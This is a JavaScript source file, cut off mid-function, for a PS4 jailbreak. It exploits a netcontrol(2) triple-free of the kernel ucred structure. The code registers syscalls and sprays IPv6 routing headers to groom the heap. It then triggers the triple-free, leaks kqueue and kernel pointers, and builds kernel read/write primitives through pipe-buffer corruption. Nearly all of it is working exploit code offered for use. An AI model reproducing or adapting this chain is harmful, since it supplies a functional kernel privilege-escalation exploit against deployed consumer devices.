/*
 * proc_term_race.js - PS4 Jailbreak (NetCtrl Triple‑Free Method)
 *
 * Merged from:
 *   - Original proc_term_race.js (offsets, syscall layout)
 *   - Working NetCtrl exploit (heap manipulation & kernel R/W)
 *
 * Integrates with: types.js, userland.js, kernel_offset.js, binloader.js
 *
 * ── BUG ──────────────────────────────────────────────────────────
 * This implementation uses the netcontrol(2) triple‑free of ucred
 * to gain kernel R/W, followed by jailbreak_shared().
 *
 * The original sys_process_terminate race is left for reference only.
 * ─────────────────────────────────────────────────────────────────
 */

include("userland.js");
include("kernel.js");
include("binloader.js");

// ===================================================================
// CONFIRMED PS4 OFFSETS (same as original)
// ===================================================================

var UCRED = {
  CR_REF: 0x00, // u_int
  CR_GID: 0x04, // gid_t
  CR_UID: 0x08, // uid_t
  CR_RUID: 0x0c, // uid_t
  CR_NGROUPS: 0x10, // int
  CR_EUID: 0x14, // uid_t
  CR_PRISON: 0x30, // struct prison*
};

var PRISON = {
  PR_PARENT: 0x38,
};

var PROC = {
  P_LIST: 0x00, // LIST_ENTRY allproc
  P_THREADS: 0x08,
  P_UCRED: 0x40,
  P_FD: 0x48,
  P_PID: 0xb0,
  P_FLAG: 0xb8,
  P_SXLOCK: 0xf8,
  P_VM_SPACE: 0x200,
  P_SCE_FLAG: 0x430,
};

var TD = {
  TD_UCRED: 0x130,
  TD_PROC: 0x08,
};

var PRISON0_ADDR = new BigInt(0xffffffff, 0x83c5c0c0);

// ===================================================================
// CORRECT PS4 SYSCALL NUMBERS
// ===================================================================

var SYSCALL = {
  EXIT: 1,
  FORK: 2,
  READ: 3,
  WRITE: 4,
  OPEN: 5,
  CLOSE: 6,
  WAIT4: 7,
  GETPID: 20,
  GETUID: 24,
  GETGID: 47,
  KILL: 37,
  SOCKETPAIR: 135,
  MMAP: 477,
  PROCESS_TERMINATE: 652, // not used
};

// ------------------------------------------------------------------
// Register all needed syscalls (including unused ones from original)
// ------------------------------------------------------------------
fn.register(
  SYSCALL.PROCESS_TERMINATE,
  "sys_process_terminate",
  ["bigint"],
  "bigint",
); // unused
fn.register(SYSCALL.FORK, "fork_sys", [], "bigint");
fn.register(SYSCALL.EXIT, "exit_sys", ["number"], "bigint");
fn.register(SYSCALL.GETPID, "getpid_sys", [], "bigint");
fn.register(SYSCALL.GETUID, "getuid_sys", [], "bigint");
fn.register(SYSCALL.GETGID, "getgid_sys", [], "bigint");
fn.register(SYSCALL.KILL, "kill_sys", ["bigint", "bigint"], "bigint");
fn.register(
  SYSCALL.WAIT4,
  "wait4_sys",
  ["bigint", "bigint", "bigint", "bigint"],
  "bigint",
);
fn.register(
  SYSCALL.SOCKETPAIR,
  "socketpair_sys",
  ["number", "number", "number", "bigint"],
  "bigint",
);

// Additional syscalls required by netcontrol exploit
fn.register(0x29, "dup", ["bigint"], "bigint");
fn.register(0x06, "close", ["bigint"], "bigint");
fn.register(0x03, "read", ["bigint", "bigint", "number"], "bigint");
fn.register(0x04, "write", ["bigint", "bigint", "number"], "bigint");
fn.register(0x36, "ioctl", ["bigint", "number", "bigint"], "bigint");
fn.register(0x2a, "pipe", ["bigint"], "bigint");
fn.register(0x16a, "kqueue", [], "bigint");
fn.register(0x61, "socket", ["number", "number", "number"], "bigint");
fn.register(
  0x87,
  "socketpair",
  ["number", "number", "number", "bigint"],
  "bigint",
);
fn.register(
  0x76,
  "getsockopt",
  ["bigint", "number", "number", "bigint", "bigint"],
  "bigint",
);
fn.register(
  0x69,
  "setsockopt",
  ["bigint", "number", "number", "bigint", "number"],
  "bigint",
);
fn.register(0x17, "setuid", ["number"], "bigint");
fn.register(0x14b, "sched_yield", [], "bigint");
fn.register(
  0x1e7,
  "cpuset_getaffinity",
  ["number", "number", "bigint", "number", "bigint"],
  "bigint",
);
fn.register(
  0x1e8,
  "cpuset_setaffinity",
  ["number", "number", "bigint", "number", "bigint"],
  "bigint",
);
fn.register(0x1d2, "rtprio_thread", ["number", "number", "bigint"], "bigint");
fn.register(
  0x63,
  "netcontrol",
  ["bigint", "number", "bigint", "number"],
  "bigint",
);
fn.register(0x1c7, "thr_new", ["bigint", "number"], "bigint");
fn.register(0x1b1, "thr_kill", ["bigint", "number"], "bigint");
fn.register(0xf0, "nanosleep", ["bigint"], "bigint");
fn.register(0x5c, "fcntl", ["bigint", "number", "number"], "bigint");

// Syscall wrappers for ROP chains
const read_wrapper = syscalls.map.get(0x03);
const write_wrapper = syscalls.map.get(0x04);
const sched_yield_wrapper = syscalls.map.get(0x14b);
const cpuset_setaffinity_wrapper = syscalls.map.get(0x1e8);
const rtprio_thread_wrapper = syscalls.map.get(0x1d2);
const recvmsg_wrapper = syscalls.map.get(0x1b);
const readv_wrapper = syscalls.map.get(0x78);
const writev_wrapper = syscalls.map.get(0x79);
const thr_exit_wrapper = syscalls.map.get(0x1af);
const setsockopt_wrapper = syscalls.map.get(0x69);
const getsockopt_wrapper = syscalls.map.get(0x76);

// libc functions for threading
fn.register(libc_addr.add(0x6ca00), "setjmp", ["bigint"], "bigint");
const setjmp = fn.setjmp;
const setjmp_addr = libc_addr.add(0x6ca00);
const longjmp_addr = libc_addr.add(0x6ca50);

// ------------------------------------------------------------------
// Global variables & constants (from netcontrol exploit)
// ------------------------------------------------------------------
const BigInt_Error = new BigInt(0xffffffff, 0xffffffff);
const PAGE_SIZE = 0x4000;
const UCRED_SIZE = 0x168; // match spray size
const IPV6_SOCK_NUM = 96;
const IOV_THREAD_NUM = 8;
const UIO_THREAD_NUM = 8;
const MAIN_CORE = 4;
const MAIN_RTPRIO = 0x100;
const PIPEBUF_SIZE = 0x18;
const FILEDESCENT_SIZE = 0x8;
const TRIPLEFREE_ITERATIONS = 8;
const KQUEUE_ITERATIONS = 5000;
const MAX_ROUNDS_TWIN = 5;
const MAX_ROUNDS_TRIPLET = 200;
const RTHDR_TAG = 0x13370000;
const UIO_IOV_NUM = 0x14;
const MSG_IOV_NUM = 0x17;
const IPV6_RTHDR = 51;
const IPV6_RTHDR_TYPE_0 = 0;
const AF_UNIX = 1;
const AF_INET6 = 28;
const SOCK_STREAM = 1;
const IPPROTO_IPV6 = 41;
const SO_SNDBUF = 0x1001;
const SOL_SOCKET = 0xffff;
const F_SETFL = 4;
const O_NONBLOCK = 4;
const FIOSETOWN = 0x8004667c;
const NET_CONTROL_NETEVENT_SET_QUEUE = 0x20000003;
const NET_CONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007;
const RTP_SET = 1;
const PRI_REALTIME = 2;

let FW_VERSION = null;
let kernel_offset = null; // will be set by get_kernel_offset()

const twins = new Array(2);
const triplets = new Array(3);
const ipv6_socks = new Array(IPV6_SOCK_NUM);

const spray_rthdr = malloc(UCRED_SIZE);
let spray_rthdr_len = -1;
const leak_rthdr = malloc(UCRED_SIZE);

const spray_rthdr_rop = malloc(IPV6_SOCK_NUM * UCRED_SIZE);
const read_rthdr_rop = malloc(IPV6_SOCK_NUM * 8);
const check_len = malloc(4);

let fdt_ofiles = new BigInt(0);
let master_r_pipe_file = new BigInt(0);
let victim_r_pipe_file = new BigInt(0);
let master_r_pipe_data = new BigInt(0);
let victim_r_pipe_data = new BigInt(0);

const master_pipe_buf = malloc(PIPEBUF_SIZE);
write32(check_len, 8);

const msg = malloc(MSG_HDR_SIZE);
const msgIov = malloc(MSG_IOV_NUM * 0x10);
const uioIovRead = malloc(UIO_IOV_NUM * 0x10);
const uioIovWrite = malloc(UIO_IOV_NUM * 0x10);

const uio_sock = malloc(8);
const iov_sock = malloc(8);

const iov_thread_ready = malloc(8 * IOV_THREAD_NUM);
const iov_thread_done = malloc(8 * IOV_THREAD_NUM);
const iov_signal_buf = malloc(8 * IOV_THREAD_NUM);

const uio_readv_thread_ready = malloc(8 * UIO_THREAD_NUM);
const uio_readv_thread_done = malloc(8 * UIO_THREAD_NUM);
const uio_readv_signal_buf = malloc(8 * UIO_THREAD_NUM);

const uio_writev_thread_ready = malloc(8 * UIO_THREAD_NUM);
const uio_writev_thread_done = malloc(8 * UIO_THREAD_NUM);
const uio_writev_signal_buf = malloc(8 * UIO_THREAD_NUM);

const spray_ipv6_ready = malloc(8);
const spray_ipv6_done = malloc(8);
const spray_ipv6_signal_buf = malloc(8);
const spray_ipv6_stack = malloc(0x2000);

// No interface needed. Just create the object when ready:
const worker = {
  rop: [],
  loop_size: 0,
  pipe_0: 0,
  pipe_1: 0,
  ready: 0n, // Use 'n' suffix for BigInt literals in JS
  done: 0n,
  signal_buf: 0n,
};

const iov_recvmsg_workers = [];
const uio_readv_workers = [];
const uio_writev_workers = [];
let spray_ipv6_worker;

let uaf_socket;

let uio_sock_0;
let uio_sock_1;
let iov_sock_0;
let iov_sock_1;
const pipe_sock = malloc(8);
const master_pipe = [0, 0];
const victim_pipe = [0, 0];

let masterRpipeFd;
let masterWpipeFd;
let victimRpipeFd;
let victimWpipeFd;

let kq_fdp;
let kl_lock;

const tmp = malloc(PAGE_SIZE);
let saved_fpu_ctrl = 0;
let saved_mxcsr = 0;

// Temporary buffers (reuse to reduce allocation)
const sockopt_len_ptr = malloc(4);
const nanosleep_timespec = malloc(0x10);
const cpu_mask_buf = malloc(0x10);
const rtprio_scratch = malloc(0x4);
const sockopt_val_buf = malloc(4);
const nc_set_buf = malloc(8);
const nc_clear_buf = malloc(8);
const spawn_thr_args = malloc(0x80);
const spawn_tid = malloc(0x8);
const spawn_cpid = malloc(0x8);
const victim_pipe_buf = malloc(PIPEBUF_SIZE);

let prev_core = -1;
let prev_rtprio = -1;
let cleanup_called = false;

// ------------------------------------------------------------------
// Helper functions (from netcontrol exploit)
// ------------------------------------------------------------------
function build_rthdr(buf, size) {
  const len = ((size >> 3) - 1) & ~1;
  const actual_size = (len + 1) << 3;
  write8(buf.add(0x00), 0); // ip6r_nxt
  write8(buf.add(0x01), len); // ip6r_len
  write8(buf.add(0x02), IPV6_RTHDR_TYPE_0); // ip6r_type
  write8(buf.add(0x03), len >> 1); // ip6r_segleft
  return actual_size;
}

function set_sockopt(sd, level, optname, optval, optlen) {
  const result = setsockopt(sd, level, optname, optval, optlen);
  if (result.eq(new BigInt(0xffffffff, 0xffffffff))) {
    throw new Error("set_sockopt error: " + hex(result));
  }
  return result;
}

function get_sockopt(sd, level, optname, optval, optlen) {
  write32(sockopt_len_ptr, optlen);
  const result = getsockopt(sd, level, optname, optval, sockopt_len_ptr);
  if (result.eq(BigInt_Error)) {
    throw new Error("get_sockopt error: " + hex(result));
  }
  return read32(sockopt_len_ptr);
}

function set_rthdr(sd, buf, len) {
  return set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}

function get_rthdr(sd, buf, max_len) {
  return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len);
}

function free_rthdr(sd) {
  set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0);
}

function free_rthdrs(sds) {
  for (const sd of sds) {
    if (!sd.eq(new BigInt(0xffffffff, 0xffffffff))) {
      free_rthdr(sd);
    }
  }
}

function pin_to_core(core) {
  write32(cpu_mask_buf, 1 << core);
  cpuset_setaffinity(3, 1, BigInt_Error, 0x10, cpu_mask_buf);
}

function get_current_core() {
  cpuset_getaffinity(3, 1, BigInt_Error, 0x10, cpu_mask_buf);
  let num = Number(read32(cpu_mask_buf));
  let pos = 0;
  while (num > 0) {
    num >>>= 1;
    pos++;
  }
  return pos - 1;
}

function set_rtprio(prio) {
  write16(rtprio_scratch, PRI_REALTIME);
  write16(rtprio_scratch.add(2), prio);
  rtprio_thread(RTP_SET, 0, rtprio_scratch);
}

function get_rtprio() {
  write16(rtprio_scratch, PRI_REALTIME);
  write16(rtprio_scratch.add(2), 0);
  rtprio_thread(0, 0, rtprio_scratch);
  return Number(read16(rtprio_scratch.add(2)));
}

function nanosleep_fun(nsec) {
  write64(nanosleep_timespec, Math.floor(nsec / 1e9));
  write64(nanosleep_timespec.add(8), nsec % 1e9);
  nanosleep(nanosleep_timespec);
}

function wait_for(addr, threshold) {
  while (!read64(addr).eq(threshold)) {
    nanosleep_fun(1);
  }
}

function fill_buffer_64(buf, val, len) {
  for (let i = 0; i < len; i += 8) {
    write64(buf.add(i), val);
  }
}

function init_threading() {
  const jmpbuf = malloc(0x60);
  setjmp(jmpbuf);
  saved_fpu_ctrl = Number(read32(jmpbuf.add(0x40)));
  saved_mxcsr = Number(read32(jmpbuf.add(0x44)));
}

// ------------------------------------------------------------------
// Worker creation and management (identical to netcontrol exploit)
// ------------------------------------------------------------------
function create_workers() {
  const sock_buf = malloc(8);
  for (let i = 0; i < IOV_THREAD_NUM; i++) {
    const ready = iov_thread_ready.add(8 * i);
    const done = iov_thread_done.add(8 * i);
    const signal_buf = iov_signal_buf.add(8 * i);
    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
    const p0 = read32(sock_buf),
      p1 = read32(sock_buf.add(4));
    const ret = iov_recvmsg_worker_rop(ready, new BigInt(p0), done, signal_buf);
    iov_recvmsg_workers[i] = {
      rop: ret.rop,
      loop_size: ret.loop_size,
      pipe_0: p0,
      pipe_1: p1,
      ready,
      done,
      signal_buf,
    };
  }
  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    const ready = uio_readv_thread_ready.add(8 * i);
    const done = uio_readv_thread_done.add(8 * i);
    const signal_buf = uio_readv_signal_buf.add(8 * i);
    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
    const p0 = read32(sock_buf),
      p1 = read32(sock_buf.add(4));
    const ret = uio_readv_worker_rop(ready, new BigInt(p0), done, signal_buf);
    uio_readv_workers[i] = {
      rop: ret.rop,
      loop_size: ret.loop_size,
      pipe_0: p0,
      pipe_1: p1,
      ready,
      done,
      signal_buf,
    };
  }
  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    const ready = uio_writev_thread_ready.add(8 * i);
    const done = uio_writev_thread_done.add(8 * i);
    const signal_buf = uio_writev_signal_buf.add(8 * i);
    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
    const p0 = read32(sock_buf),
      p1 = read32(sock_buf.add(4));
    const ret = uio_writev_worker_rop(ready, new BigInt(p0), done, signal_buf);
    uio_writev_workers[i] = {
      rop: ret.rop,
      loop_size: ret.loop_size,
      pipe_0: p0,
      pipe_1: p1,
      ready,
      done,
      signal_buf,
    };
  }
  {
    const ready = spray_ipv6_ready,
      done = spray_ipv6_done,
      signal_buf = spray_ipv6_signal_buf;
    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
    const p0 = read32(sock_buf),
      p1 = read32(sock_buf.add(4));
    const ret = ipv6_sock_spray_and_read_rop(
      ready,
      new BigInt(p0),
      done,
      signal_buf,
    );
    spray_ipv6_worker = {
      rop: ret.rop,
      loop_size: ret.loop_size,
      pipe_0: p0,
      pipe_1: p1,
      ready,
      done,
      signal_buf,
    };
  }
}

function init_workers() {
  init_threading();
  for (let i = 0; i < IOV_THREAD_NUM; i++) {
    const w = iov_recvmsg_workers[i];
    const ret = spawn_thread(w.rop, w.loop_size);
    if (ret.eq(BigInt_Error))
      throw new Error("Could not spawn iov_recvmsg_workers[" + i + "]");
    w.thread_id = Number(ret.and(0xffffffff));
  }
  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    const w = uio_readv_workers[i];
    const ret = spawn_thread(w.rop, w.loop_size);
    if (ret.eq(BigInt_Error))
      throw new Error("Could not spawn uio_readv_workers[" + i + "]");
    w.thread_id = Number(ret.and(0xffffffff));
  }
  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    const w = uio_writev_workers[i];
    const ret = spawn_thread(w.rop, w.loop_size);
    if (ret.eq(BigInt_Error))
      throw new Error("Could not spawn uio_writev_workers[" + i + "]");
    w.thread_id = Number(ret.and(0xffffffff));
  }
}

// Trigger / wait for worker batches
function trigger_iov_recvmsg() {
  for (let i = 0; i < IOV_THREAD_NUM; i++) {
    const w = iov_recvmsg_workers[i];
    write64(w.done, 0);
    const ret = write(new BigInt(w.pipe_1), w.signal_buf, 1);
    if (ret.eq(BigInt_Error))
      throw new Error("Could not signal 'run' iov_recvmsg_workers[" + i + "]");
  }
}
function wait_iov_recvmsg() {
  for (let i = 0; i < IOV_THREAD_NUM; i++)
    wait_for(iov_recvmsg_workers[i].done, 1);
}

function trigger_uio_readv() {
  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    const w = uio_readv_workers[i];
    write64(w.done, 0);
    const ret = write(new BigInt(w.pipe_1), w.signal_buf, 1);
    if (ret.eq(BigInt_Error))
      throw new Error("Could not signal 'run' uio_readv_workers[" + i + "]");
  }
}
function wait_uio_readv() {
  for (let i = 0; i < UIO_THREAD_NUM; i++)
    wait_for(uio_readv_workers[i].done, 1);
}

function trigger_uio_writev() {
  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    const w = uio_writev_workers[i];
    write64(w.done, 0);
    const ret = write(new BigInt(w.pipe_1), w.signal_buf, 1);
    if (ret.eq(BigInt_Error))
      throw new Error("Could not signal 'run' uio_writev_workers[" + i + "]");
  }
}
function wait_uio_writev() {
  for (let i = 0; i < UIO_THREAD_NUM; i++)
    wait_for(uio_writev_workers[i].done, 1);
}

function trigger_ipv6_spray_and_read() {
  write64(spray_ipv6_worker.done, 0);
  const ret = spawn_thread(
    spray_ipv6_worker.rop,
    spray_ipv6_worker.loop_size,
    spray_ipv6_stack,
  );
  if (ret.eq(BigInt_Error)) throw new Error("Could not spray_ipv6_worker");
  spray_ipv6_worker.thread_id = Number(ret.and(0xffffffff));
  const wr = write(
    new BigInt(spray_ipv6_worker.pipe_1),
    spray_ipv6_worker.signal_buf,
    1,
  );
  if (wr.eq(BigInt_Error))
    throw new Error("Could not signal 'run' spray_ipv6_worker");
}
function wait_ipv6_spray_and_read() {
  wait_for(spray_ipv6_worker.done, 1);
}

// ------------------------------------------------------------------
// Heap manipulation: find_twins, find_triplet, triple‑free
// ------------------------------------------------------------------
function find_twins() {
  let count = 0;
  const spray_add = spray_rthdr.add(0x04);
  const leak_add = leak_rthdr.add(0x04);
  while (count < MAX_ROUNDS_TWIN) {
    if (debugging.info.memory.available === 0) {
      // memory check – if no memory, abort
      log("netctrl failed!");
      cleanup();
      return false;
    }
    for (let i = 0; i < ipv6_socks.length; i++) {
      write32(spray_add, RTHDR_TAG | i);
      set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
    }
    for (let i = 0; i < ipv6_socks.length; i++) {
      get_rthdr(ipv6_socks[i], leak_rthdr, 8);
      const val = read32(leak_add);
      const j = val & 0xffff;
      if ((val & 0xffff0000) === RTHDR_TAG && i !== j) {
        twins[0] = i;
        twins[1] = j;
        log("Twins found: [" + i + "] [" + j + "]");
        return true;
      }
    }
    count++;
  }
  log("find_twins failed");
  return false;
}

function find_triplet(master, other, iterations) {
  if (iterations === undefined) iterations = MAX_ROUNDS_TRIPLET;
  let count = 0;
  const spray_add = spray_rthdr.add(0x04);
  const leak_add = leak_rthdr.add(0x04);
  while (count < iterations) {
    for (let i = 0; i < ipv6_socks.length; i++) {
      if (i === master || i === other) continue;
      write32(spray_add, RTHDR_TAG | i);
      set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
    }
    get_rthdr(ipv6_socks[master], leak_rthdr, 8);
    const val = read32(leak_add);
    const j = val & 0xffff;
    if ((val & 0xffff0000) === RTHDR_TAG && j !== master && j !== other)
      return j;
    count++;
  }
  return -1;
}

function trigger_ucred_triplefree() {
  let end = false;
  write64(msgIov.add(0x0), 1);
  write64(msgIov.add(0x8), 1);
  let main_count = 0;
  while (!end && main_count < TRIPLEFREE_ITERATIONS) {
    main_count++;
    const dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
    write32(nc_set_buf, Number(dummy_socket.and(0xffffffff)));
    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
    close(new BigInt(dummy_socket));
    setuid(1);
    uaf_socket = Number(socket(AF_UNIX, SOCK_STREAM, 0));
    setuid(1);
    write32(nc_clear_buf, uaf_socket);
    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);
    for (let i = 0; i < 32; i++) {
      trigger_iov_recvmsg();
      sched_yield();
      write(new BigInt(iov_sock_1), tmp, 1);
      wait_iov_recvmsg();
      read(new BigInt(iov_sock_0), tmp, 1);
    }
    close(dup(new BigInt(uaf_socket)));
    end = find_twins();
    if (!end) {
      close(new BigInt(uaf_socket));
      continue;
    }
    log("Triple freeing...");
    free_rthdr(ipv6_socks[twins[1]]);
    let count = 0;
    while (count < 10000) {
      trigger_iov_recvmsg();
      sched_yield();
      get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8);
      if (read32(leak_rthdr) === 1) break;
      write(new BigInt(iov_sock_1), tmp, 1);
      wait_iov_recvmsg();
      read(new BigInt(iov_sock_0), tmp, 1);
      count++;
    }
    if (count === 1000) {
      close(new BigInt(uaf_socket));
      continue;
    }
    triplets[0] = twins[0];
    close(dup(new BigInt(uaf_socket)));
    triplets[1] = find_triplet(triplets[0], -1);
    if (triplets[1] === -1) {
      write(new BigInt(iov_sock_1), tmp, 1);
      close(new BigInt(uaf_socket));
      end = false;
      continue;
    }
    write(new BigInt(iov_sock_1), tmp, 1);
    triplets[2] = find_triplet(triplets[0], triplets[1]);
    if (triplets[2] === -1) {
      close(new BigInt(uaf_socket));
      end = false;
      continue;
    }
    wait_iov_recvmsg();
    read(new BigInt(iov_sock_0), tmp, 1);
  }
  return !(main_count === TRIPLEFREE_ITERATIONS);
}

// ------------------------------------------------------------------
// Leak kqueue & kernel pointers
// ------------------------------------------------------------------
function leak_kqueue() {
  debug("Leaking kqueue...");
  free_rthdr(ipv6_socks[triplets[1]]);
  let kq = new BigInt(0);
  const magic_val = new BigInt(0x0, 0x1430000);
  const magic_add = leak_rthdr.add(0x08);
  let count = 0;
  while (count < KQUEUE_ITERATIONS) {
    kq = kqueue();
    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);
    if (read64(magic_add).eq(magic_val) && !read64(leak_rthdr.add(0x98)).eq(0))
      break;
    close(kq);
    sched_yield();
    count++;
  }
  if (count === KQUEUE_ITERATIONS) {
    log("Failed to leak kqueue_fdp");
    return false;
  }
  kl_lock = read64(leak_rthdr.add(0x60));
  kq_fdp = read64(leak_rthdr.add(0x98));
  if (kq_fdp.eq(0)) {
    log("Failed to leak kqueue_fdp");
    return false;
  }
  debug("kq_fdp: " + hex(kq_fdp) + " kl_lock: " + hex(kl_lock));
  close(kq);
  triplets[1] = find_triplet(triplets[0], triplets[2]);
  return true;
}

// ------------------------------------------------------------------
// Slow kernel r/w (via pipe corruption and triplets)
// ------------------------------------------------------------------
function build_uio(uio, uio_iov, uio_td, read_op, addr, size) {
  write64(uio.add(0x00), uio_iov);
  write64(uio.add(0x08), UIO_IOV_NUM);
  write64(uio.add(0x10), BigInt_Error);
  write64(uio.add(0x18), size);
  write32(uio.add(0x20), 1); // UIO_SYSSPACE
  write32(uio.add(0x24), read_op ? 1 : 0); // UIO_WRITE or UIO_READ
  write64(uio.add(0x28), uio_td);
  write64(uio.add(0x30), addr);
  write64(uio.add(0x38), size);
}

function kreadslow64(address) {
  const buffer = kreadslow(address, 8);
  if (buffer.eq(BigInt_Error)) {
    cleanup();
    throw new Error("Netctrl failed - Shutdown and try again");
  }
  return read64(buffer);
}

function kreadslow(addr, size) {
  if (debugging.info.memory.available === 0) {
    cleanup();
    return BigInt_Error;
  }
  const leak_buffers = new Array(UIO_THREAD_NUM);
  for (let i = 0; i < UIO_THREAD_NUM; i++) leak_buffers[i] = malloc(size);
  write32(sockopt_val_buf, size);
  setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);
  write(new BigInt(uio_sock_1), tmp, size);
  write64(uioIovRead.add(0x08), size);
  free_rthdr(ipv6_socks[triplets[1]]);
  let count = 0;
  while (count < 10000) {
    if (debugging.info.memory.available === 0) {
      cleanup();
      return BigInt_Error;
    }
    trigger_uio_writev();
    sched_yield();
    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
    if (read32(leak_rthdr.add(0x08)) === UIO_IOV_NUM) break;
    read(new BigInt(uio_sock_0), tmp, size);
    for (let i = 0; i < UIO_THREAD_NUM; i++)
      read(new BigInt(uio_sock_0), leak_buffers[i], size);
    wait_uio_writev();
    write(new BigInt(uio_sock_1), tmp, size);
    count++;
  }
  if (count === 10000) return BigInt_Error;
  const uio_iov = read64(leak_rthdr);
  build_uio(msgIov, uio_iov, 0, true, addr, size);
  free_rthdr(ipv6_socks[triplets[2]]);
  while (true) {
    if (debugging.info.memory.available === 0) {
      cleanup();
      return BigInt_Error;
    }
    trigger_iov_recvmsg();
    sched_yield();
    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
    if (read32(leak_rthdr.add(0x20)) === 1) break;
    write(new BigInt(iov_sock_1), tmp, 1);
    wait_iov_recvmsg();
    read(new BigInt(iov_sock_0), tmp, 1);
  }
  read(new BigInt(uio_sock_0), tmp, size);
  let leak_buffer = new BigInt(0);
  const tag = new BigInt(0x41414141, 0x41414141);
  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    read(new BigInt(uio_sock_0), leak_buffers[i], size);
    if (!read64(leak_buffers[i]).eq(tag)) {
      leak_buffer = leak_buffers[i];
      break;
    }
  }
  wait_uio_writev();
  write(new BigInt(iov_sock_1), tmp, 1);
  if (leak_buffer.eq(0)) {
    wait_iov_recvmsg();
    read(new BigInt(iov_sock_0), tmp, 1);
    return BigInt_Error;
  }
  triplets[1] = find_triplet(triplets[0], -1);
  if (triplets[1] === -1) {
    wait_iov_recvmsg();
    read(new BigInt(iov_sock_0), tmp, 1);
    return BigInt_Error;
  }
  triplets[2] = find_triplet(triplets[0], triplets[1]);
  if (triplets[2] === -1) {
    wait_iov_recvmsg();
    read(new BigInt(iov_sock_0), tmp, 1);
    return BigInt_Error;
  }
  wait_iov_recvmsg();
  read(new BigInt(iov_sock_0), tmp, 1);
  return leak_buffer;
}

function kwriteslow(addr, buffer, size) {
  write32(sockopt_val_buf, size);
  setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);
  write64(uioIovWrite.add(0x08), size);
  free_rthdr(ipv6_socks[triplets[1]]);
  while (true) {
    if (debugging.info.memory.available === 0) {
      cleanup();
      return BigInt_Error;
    }
    trigger_uio_readv();
    sched_yield();
    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
    if (read32(leak_rthdr.add(0x08)) === UIO_IOV_NUM) break;
    for (let i = 0; i < UIO_THREAD_NUM; i++)
      write(new BigInt(uio_sock_1), buffer, size);
    wait_uio_readv();
  }
  const uio_iov = read64(leak_rthdr);
  build_uio(msgIov, uio_iov, 0, false, addr, size);
  free_rthdr(ipv6_socks[triplets[2]]);
  while (true) {
    if (debugging.info.memory.available === 0) {
      cleanup();
      return BigInt_Error;
    }
    trigger_iov_recvmsg();
    sched_yield();
    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
    if (read32(leak_rthdr.add(0x20)) === 1) break;
    write(new BigInt(iov_sock_1), tmp, 1);
    wait_iov_recvmsg();
    read(new BigInt(iov_sock_0), tmp, 1);
  }
  for (let i = 0; i < UIO_THREAD_NUM; i++)
    write(new BigInt(uio_sock_1), buffer, size);
  triplets[1] = find_triplet(triplets[0], -1);
  wait_uio_readv();
  write(new BigInt(iov_sock_1), tmp, 1);
  triplets[2] = find_triplet(triplets[0], triplets[1]);
  if (triplets[2] === -1) {
    wait_iov_recvmsg();
    read(new BigInt(iov_sock_0), tmp, 1);
    return BigInt_Error;
  }
  wait_iov_recvmsg();
  read(new BigInt(iov_sock_0), tmp, 1);
  return new BigInt(0);
}

// Fast kernel r/w after pipe corruption
function corrupt_pipe_buf(cnt, _in, out, size, buffer) {
  if (buffer.eq(0)) throw new Error("buffer cannot be zero");
  write32(victim_pipe_buf.add(0x00), cnt);
  write32(victim_pipe_buf.add(0x04), _in);
  write32(victim_pipe_buf.add(0x08), out);
  write32(victim_pipe_buf.add(0x0c), size);
  write64(victim_pipe_buf.add(0x10), buffer);
  write(new BigInt(masterWpipeFd), victim_pipe_buf, PIPEBUF_SIZE);
  return read(new BigInt(masterRpipeFd), victim_pipe_buf, PIPEBUF_SIZE);
}

function kwrite(dest, src, n) {
  corrupt_pipe_buf(0, 0, 0, PAGE_SIZE, dest);
  return write(new BigInt(victimWpipeFd), src, n);
}
function kread(dest, src, n) {
  corrupt_pipe_buf(n, 0, 0, PAGE_SIZE, src);
  read(new BigInt(victimRpipeFd), dest, n);
}
function kwrite64(addr, val) {
  write64(tmp, val);
  kwrite(addr, tmp, 8);
}
function kwrite32(addr, val) {
  write32(tmp, val);
  kwrite(addr, tmp, 4);
}
function kread64(addr) {
  kread(tmp, addr, 8);
  return read64(tmp);
}
function kread32(addr) {
  kread(tmp, addr, 4);
  return read32(tmp);
}

function read_buffer(addr, len) {
  const buf = new Uint8Array(len);
  for (let i = 0; i < len; i++) buf[i] = Number(read8(addr.add(i)));
  return buf;
}
function write_buffer(addr, buf) {
  for (let i = 0; i < buf.length; i++) write8(addr.add(i), buf[i]);
}
// Hook into kernel.js interface
kernel.read_buffer = function (kaddr, len) {
  kread(tmp, kaddr, len);
  return read_buffer(tmp, len);
};
kernel.write_buffer = function (kaddr, buf) {
  write_buffer(tmp, buf);
  kwrite(kaddr, tmp, buf.length);
};

function fget(fd) {
  return kread64(fdt_ofiles.add(fd * FILEDESCENT_SIZE));
}
function fhold(fp) {
  kwrite32(fp.add(0x28), kread32(fp.add(0x28)) + 1);
}
function remove_rthr_from_socket(fd) {
